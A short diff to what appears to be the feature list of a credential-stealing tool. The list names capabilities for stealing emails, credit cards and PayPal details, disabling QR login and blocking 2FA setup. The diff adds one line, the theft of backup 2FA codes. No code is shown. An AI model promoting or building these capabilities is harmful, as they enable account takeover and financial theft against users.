@@ -9,6 +9,7 @@
         <b> - Email Stealer ( Even when it changes )</b>
         <b> - Credit Card Stealer ( When user Purchase )</b>
         <b> - Paypal Stealer ( When user Purchase )</b>
+        <b> - Backup 2FA Codes</b>
         <b> - Disable QR</b>
         <b> - Block 2FA Creation</b>
         <br/>
